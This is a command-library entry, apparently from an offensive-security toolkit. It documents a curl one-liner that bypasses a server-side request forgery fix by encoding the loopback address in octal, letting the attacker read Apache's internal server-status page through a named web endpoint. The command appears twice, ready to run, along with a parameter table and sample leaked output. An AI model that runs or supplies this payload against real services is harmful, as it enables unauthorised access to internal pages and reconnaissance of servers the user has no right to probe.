---
data: >-
  curl -X POST -d 'url=http://0177.0000000000001:8081/server-status'
  https://www.apitest.io/request
tags:
  - ssrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.431Z'
id: c4a59c6a-4438-40d1-a86f-ee2ff5f95994
verified: false
validated: true
submitted: true
---
# curl-ssrf-ip-bypass-octal

## Command

```bash
curl -X POST -d 'url=http://0177.0000000000001:8081/server-status' https://www.apitest.io/request
```

## Description

Bypasses SSRF fix using octal IP encoding to access Apache server-status.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | Octal-encoded URL | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://0177.0000000000001:8081/server-status' https://www.apitest.io/request
```

## Expected Output

Apache server-status: Server Version: Apache/2.2.15 (Unix) ...

## Related

- [[Related Procedure]]
